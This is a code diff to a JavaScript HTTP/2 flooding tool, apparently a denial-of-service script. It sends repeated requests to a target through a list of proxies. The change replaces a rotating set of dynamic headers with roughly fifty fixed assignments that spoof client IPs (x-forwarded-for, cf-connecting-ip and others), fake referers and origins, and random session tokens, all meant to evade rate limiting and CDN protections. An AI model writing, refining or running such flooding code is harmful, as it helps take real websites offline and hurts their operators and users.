@@ -128,58 +128,6 @@ const secChUaPlatformHeaders = [
     "iOS"
 ];
 
-const dynamicHeaders = [
-    { "x-forwarded-for": () => randomIp() },
-    { "x-real-ip": () => randomIp() },
-    { "x-client-ip": () => randomIp() },
-    { "cf-connecting-ip": () => randomIp() },
-    { "x-forwarded-host": () => parsedTarget.host },
-    { "x-forwarded-proto": () => randomElement(["https", "http"]) },
-    { "x-frame-options": () => randomElement(["DENY", "SAMEORIGIN"]) },
-    { "referer": () => `https://${randomString(5)}.com/${randomString(8)}` },
-    { "origin": () => `https://${randomString(5)}.com` },
-    { "via": () => randomString(12) },
-    { "akamai-origin-hop": () => randomString(12) },
-    { "cluster-ip": () => randomString(12) },
-    { "x-request-id": () => randomString(16) },
-    { "x-correlation-id": () => randomString(16) },
-    { "x-device-id": () => randomString(20) },
-    { "x-session-token": () => randomString(32) },
-    { "pragma": () => randomElement(["no-cache", "max-age=0"]) },
-    { "dnt": () => randomElement(["0", "1"]) },
-    { "x-cache-status": () => randomElement(["hit", "miss", "bypass"]) },
-    { "x-browser-id": () => randomString(16) },
-    { "x-app-version": () => `${randomInt(1, 5)}.${randomInt(0, 9)}.${randomInt(0, 9)}` },
-    { "x-custom-header": () => randomString(10) },
-    { "x-trace-id": () => randomString(24) },
-    { "x-geo-location": () => randomElement(["US", "EU", "ASIA", "AU"]) },
-    { "x-user-session": () => randomString(20) },
-    { "x-api-key": () => randomString(32) },
-    { "x-request-timestamp": () => Date.now().toString() },
-    { "x-csrf-token": () => randomString(16) },
-    { "x-forwarded-port": () => randomElement(["80", "443", "8080"]) },
-    { "x-originating-ip": () => randomIp() },
-    { "x-remote-ip": () => randomIp() },
-    { "x-cloud-trace-context": () => `${randomString(16)}/${randomInt(1000, 9999)}` },
-    { "x-amzn-trace-id": () => `Root=1-${randomString(8)}-${randomString(24)}` },
-    { "x-forwarded-server": () => randomString(10) },
-    { "x-http-method-override": () => randomElement(methods) },
-    { "x-ua-compatible": () => "IE=edge" },
-    { "x-dns-prefetch-control": () => randomElement(["on", "off"]) },
-    { "x-download-options": () => "noopen" },
-    { "x-content-type-options": () => "nosniff" },
-    { "x-xss-protection": () => randomElement(["0", "1; mode=block"]) },
-    { "x-powered-by": () => randomString(10) },
-    { "x-server-id": () => randomString(12) },
-    { "x-client-session": () => randomString(20) },
-    { "x-request-origin": () => `https://${randomString(5)}.com` },
-    { "x-session-id": () => randomString(24) },
-    { "x-transaction-id": () => randomString(20) },
-    { "x-client-version": () => `${randomInt(1, 5)}.${randomInt(0, 9)}` },
-    { "x-environment": () => randomElement(["production", "staging", "development"]) },
-    { "x-region": () => randomElement(["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]) }
-];
-
 const proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
@@ -266,6 +214,55 @@ headers["sec-fetch-site"] = "none";
 headers["sec-fetch-user"] = "?1";
 headers["upgrade-insecure-requests"] = "1";
 headers["x-requested-with"] = "XMLHttpRequest";
+headers["x-forwarded-for"] = randomIp();
+headers["x-real-ip"] = randomIp();
+headers["x-client-ip"] = randomIp();
+headers["cf-connecting-ip"] = randomIp();
+headers["x-forwarded-host"] = parsedTarget.host;
+headers["x-forwarded-proto"] = randomElement(["https", "http"]);
+headers["x-frame-options"] = randomElement(["DENY", "SAMEORIGIN"]);
+headers["referer"] = `https://${randomString(5)}.com/${randomString(8)}`;
+headers["origin"] = `https://${randomString(5)}.com`;
+headers["via"] = randomString(12);
+headers["akamai-origin-hop"] = randomString(12);
+headers["cluster-ip"] = randomString(12);
+headers["x-request-id"] = randomString(16);
+headers["x-correlation-id"] = randomString(16);
+headers["x-device-id"] = randomString(20);
+headers["x-session-token"] = randomString(32);
+headers["pragma"] = randomElement(["no-cache", "max-age=0"]);
+headers["dnt"] = randomElement(["0", "1"]);
+headers["x-cache-status"] = randomElement(["hit", "miss", "bypass"]);
+headers["x-browser-id"] = randomString(16);
+headers["x-app-version"] = `${randomInt(1, 5)}.${randomInt(0, 9)}.${randomInt(0, 9)}`;
+headers["x-custom-header"] = randomString(10);
+headers["x-trace-id"] = randomString(24);
+headers["x-geo-location"] = randomElement(["US", "EU", "ASIA", "AU"]);
+headers["x-user-session"] = randomString(20);
+headers["x-api-key"] = randomString(32);
+headers["x-request-timestamp"] = Date.now().toString();
+headers["x-csrf-token"] = randomString(16);
+headers["x-forwarded-port"] = randomElement(["80", "443", "8080"]);
+headers["x-originating-ip"] = randomIp();
+headers["x-remote-ip"] = randomIp();
+headers["x-cloud-trace-context"] = `${randomString(16)}/${randomInt(1000, 9999)}`;
+headers["x-amzn-trace-id"] = `Root=1-${randomString(8)}-${randomString(24)}`;
+headers["x-forwarded-server"] = randomString(10);
+headers["x-http-method-override"] = randomElement(methods);
+headers["x-ua-compatible"] = "IE=edge";
+headers["x-dns-prefetch-control"] = randomElement(["on", "off"]);
+headers["x-download-options"] = "noopen";
+headers["x-content-type-options"] = "nosniff";
+headers["x-xss-protection"] = randomElement(["0", "1; mode=block"]);
+headers["x-powered-by"] = randomString(10);
+headers["x-server-id"] = randomString(12);
+headers["x-client-session"] = randomString(20);
+headers["x-request-origin"] = `https://${randomString(5)}.com`;
+headers["x-session-id"] = randomString(24);
+headers["x-transaction-id"] = randomString(20);
+headers["x-client-version"] = `${randomInt(1, 5)}.${randomInt(0, 9)}`;
+headers["x-environment"] = randomElement(["production", "staging", "development"]);
+headers["x-region"] = randomElement(["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]);
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
@@ -334,15 +331,8 @@ function runFlooder() {
 
         client.on("connect", () => {
             const intervalAttack = setInterval(() => {
-                const selectedHeaders = dynamicHeaders.slice(0, randomInt(10, 20)); // Randomly select 10-20 headers
-                const requestHeaders = {...headers};
-                selectedHeaders.forEach(header => {
-                    const key = Object.keys(header)[0];
-                    const value = typeof header[key] === "function" ? header[key]() : header[key];
-                    requestHeaders[key] = value;
-                });
                 for (let i = 0; i < args.rate; i++) {
-                    const request = client.request(requestHeaders);
+                    const request = client.request(headers);
                     request.on("response", () => {
                         request.close();
                         request.destroy();
